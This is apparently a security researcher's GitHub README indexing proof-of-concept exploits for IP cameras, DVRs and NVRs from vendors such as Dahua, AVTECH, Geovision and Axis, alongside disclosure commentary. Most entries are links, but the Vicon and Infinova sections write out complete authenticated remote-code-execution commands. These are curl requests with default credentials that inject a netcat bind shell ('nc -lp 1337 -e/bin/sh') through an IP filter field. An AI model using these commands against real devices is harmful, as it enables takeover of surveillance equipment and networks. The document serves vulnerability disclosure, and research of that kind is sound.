# PoC
misc PoC - Internet of (In)Security Things

Well worth to read about these crappy (in)security things:
https://ipvm.com/reports/security-exploits

Dahua DHIP JSON Debug Console (authenticated)
---
2019-04-10

This script will use Dahua 'DHIP' P2P binary protocol, that works on normal HTTP/HTTPS ports and TCP/5000

Will attach to Dahua devices internal 'Debug Console' using JSON (same type as the former debug on TCP/6789) 

https://github.com/mcw0/PoC/blob/master/Dahua-DHIP-JSON-Debug-Console.py

Have fun, bashis


VDOO
---
2019-01-23

Greetings, long time and no publish ...

I am still around and doing my research, but the news is that I also try to work with VDOO (https://www.vdoo.com/) for vendor management, and this has unfortunately delayed my Full Disclosure process somewhat ...

Anyway, several interesting researches coming up as Full Disclosure here on my GitHub.

With the collaboration with VDOO I can work with that I like to do, and not waste time with the vendors who do (not want | don't understand | want to ignore | want to delay | whatever).

The latest are some Reolink (https://reolink.com/) stuff, which you will find here: https://www.vdoo.com/blog/working-with-the-community-%E2%80%93-significant-vulnerabilities-in-reolink-cameras/.


AVTECH Corporation
---
2018-06-18

AVTECH {DVR/NVR/IPC} Heap Overflow, IPCP API, RCE

https://github.com/mcw0/PoC/blob/master/Avtech_Undocumented_API_and_RCE.txt

https://github.com/mcw0/PoC/blob/master/AVTECH-IPCP-RCE.py


Reolink Digital Technology Co., Ltd.
---
2018-06-03

Reolink {IPC} RCE (Authenticated)

https://github.com/mcw0/PoC/blob/master/Reolink-IPC-RCE.py


Shenzhen TVT Digital Technology Co. Ltd
---
2018-04-09

Shenzhen TVT Digital Technology Co. Ltd & OEM {DVR/NVR/IPC} API RCE
https://github.com/mcw0/PoC/blob/master/TVT_and_OEM_IPC_NVR_DVR_RCE_Backdoor_and_Information_Disclosure.txt
https://github.com/mcw0/PoC/blob/master/TVT-PoC.py


AVTECH
---
2018-03-05

AVTECH {DVR/NVR/IPC} Authenticated RCE

https://github.com/mcw0/PoC/blob/master/AVTECH-RCE.py

Geovision Inc.
---
2018-02-01

Geovision Inc. IP Camera/Video/Access Control Multiple Remote Command Execution - Multiple Stack Overflow - Double free - Unauthorized Access
https://github.com/mcw0/PoC/blob/master/Geovision%20IP%20Camera%20Multiple%20Remote%20Command%20Execution%20-%20Multiple%20Stack%20Overflow%20-%20Double%20free%20-%20Unauthorized%20Access.txt

Geovision Inc. IP Camera & Video Server Remote Command Execution PoC
https://github.com/mcw0/PoC/blob/master/Geovision-PoC.py

Herospeed
---
2018-01-22

Herospeed TelnetSwitch daemon running on TCP/787, for allowing enable of the telnetd.
Where one small stack overflow allows us to overwrite the dynamicly generated password and enable telnetd.
https://github.com/mcw0/PoC/blob/master/Herospeed-TelnetSwitch.py

Foscam
---
2018-01-15

Small OpenSSL wrapper to looping different encryption keys/digest and cipher on Foscam IPC Firmware images.
https://github.com/mcw0/PoC/blob/master/decrypt-foscam.py

Deobfuscate strings/login/password/cryptokey in misc Foscam IPC binaries and libs
https://github.com/mcw0/PoC/blob/master/deobfuscate-foscam.py

Vitek RCE and Information Disclosure (and possible other OEM) 0-day
---
2017-12-22

https://github.com/mcw0/PoC/blob/master/Vitek_RCE_and_information_disclosure.txt

Remote Stack Format String in 'nsd' binary from multiple OEM (0-day)
---
2017-12-14

https://github.com/mcw0/PoC/blob/master/Remote_Stack_Format_String_multiple%20OEM.txt

Image here: http://62.43.36.107:50021/Public/CCTV/GWSecu/GWSecu%20Updater%20para%20c%C3%A1maras/Firmware%20para%20c%C3%A1mara%20domo/

non-crashing Format String Backdoor Proof of Concept
---
2017-12-05

https://github.com/mcw0/PoC/blob/master/tiny-w3-mcw.c

Vicon Security RCE (authenticated)
---
2017-12-03

// Enable 'IP Filter'

curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=2"
  
// Add to 'IP Filter' and execute

curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
  
// Disable 'IP Filter'

curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=0"
  
// Remove from 'IP Filter'

curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"

Infinova RCE (authenticated)
---
2017-12-03

// Enable 'IP Filter'

curl --user admin:admin -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=2"

// Add to 'IP Filter' and execute

curl --user admin:admin -v -X POST http://[IP:PORT]/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"

// Disable 'IP Filter'

curl --user admin:admin -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=0"

// Remove from 'IP Filter'

curl --user admin:admin -v -X POST http://[IP:PORT]/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"

Note: Quite sure there is additional OEM's that share same.

Axis Communications
---
2017-12-01
Axis Communications MPQT/PACS Heap Overflow and Information Leakage
https://github.com/mcw0/PoC/blob/master/Axis_Communications_MPQT_PACS_Heap_Overflow_and_information_leakage.txt

Stunnel
---
2017-11-13
Reverse stunnel TLSv1 privacy shell
https://github.com/mcw0/PoC/blob/master/Reverse%20stunnel%20TLSv1%20privacy%20shell.txt

Vivotek
---
2017-11-13
Vivotek IP Cameras - Remote Stack Overflow
https://github.com/mcw0/PoC/blob/master/Vivotek%20IP%20Cameras%20-%20Remote%20Stack%20Overflow.txt

Uniview
---
2017-10-29
Uniview RCE and export config PoC
https://github.com/mcw0/PoC/blob/master/Uniview%20RCE%20PoC.txt

Axis
---
2017-10-19
One old forgotten fuzzing back in Q3/2016 that lead to RCE (PoC: Remote connect back shell) and remote read of /etc/shadow.
Reported to Axis and fixed in Q3/2016, still posting here now as it may be good hint.
https://github.com/mcw0/PoC/blob/master/Axis%20SSI%20RCE

DAHUA
---
2017-10-17
Enable / Disable Telnetd in Dahua (for newer firmware versions)
https://github.com/mcw0/PoC/blob/master/dahua-telnetd-json.py

2017-05-03

Public rerelease of Dahua Backdoor PoC
https://github.com/mcw0/PoC/blob/master/dahua-backdoor-PoC.py

2017-03-20

With my newfound knowledge of vulnerable devices out there with an unbelievable number of more than 1 million Dahua / OEM units, where knowledge comes from a report made by NSFOCUS and my own research on shodan.io.

With this knowledge, I will not release the Python PoC to the public as before said of April 5, as it is not necessary when the PoC has already been verified by IPVM and other independent security researchers.

However, I'm open to share the PoC with serious security researchers if so desired, please e-mail me off list and be clear about who you are so I do not take you for a beggar, which I ignore.

NSFOCUS report: http://blog.nsfocus.net/dahua-cameras-unauthorized-access-vulnerability-technical-analysis-solution/

/bashis

---

Did you notice the date and time stamps on Dahua's patches?
Check the screen shots from
http://us.dahuasecurity.com/en/us/Security-Bulletin_030617.php
https://github.com/mcw0/PoC/blob/master/Dahua%20Wiki%20Firmware%20Timestamp.png

https://dahuawiki.com/images/Firmware/DVR/Q2.2017/
https://github.com/mcw0/PoC/blob/master/Dahua%20Wiki%20Firmware%20listing.png

Not only NVR/DVR/IPC/HDCVI are in the list

Intercom system as well, VTO2000A has been confirmed
http://www1.dahuasecurity.com/au/products/vto2000a-762.html

